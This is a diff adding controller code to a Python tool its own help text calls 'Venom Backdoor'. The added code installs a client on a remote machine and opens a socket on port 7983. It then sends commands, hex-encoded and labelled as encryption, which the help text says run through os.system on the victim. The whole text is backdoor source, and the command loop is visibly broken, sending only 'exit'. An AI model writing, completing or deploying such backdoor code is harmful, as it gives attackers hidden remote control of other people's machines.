@@ -6,7 +6,17 @@ import paramiko
 import subprocess
 import time
 def main():
-    
+    option = input("Enter command: ")
+    if(len(option) == 0):
+        pass
+    elif(option.lower() == "install"):
+        address = input("Enter address to install client on: ")
+        install(address)
+    elif(option.lower() == "connect"):
+        address = input("Enter address to connect to: ")
+        connect(address)
+    else:
+        printHelp()
 def install(address):
     f = open("/etc/venomClient", "r")
     fileCont = f.read()
@@ -28,4 +38,29 @@ def install(address):
     if(len(error) > 0):
         print(f"An error occured: {error}")
     time.sleep(1)
+def connect(address):
+    sock = socket.create_connection((address, 7983))
+    print(f"Successfully connected to {address}.")
+    x = True
+    while(x):
+        option = input("Enter command to send to remote server: ")
+        if(option.lower() == "cmd"):
+            sock.send(encrypt("CMD"))
+            y = True
+            while(y):
+                command = input(f"[Command@{address}# ")
+                if(command.lower() == "exit"):
+                    y = False
+                if(not y):
+                    sock.send(encrypt(command))
+def encrypt(message):
+    firstEncode = message.encode('utf-8')
+    return firstEncode.hex().encode('utf-8')
+def printHelp():
+    print("""
+Venom Backdoor Commands:
+    
+    cmd     |     Enters menu to send commands directly to os.system on remote client.
+    install |     Prepares to install Venom client on remote machine.
+""")
 main()
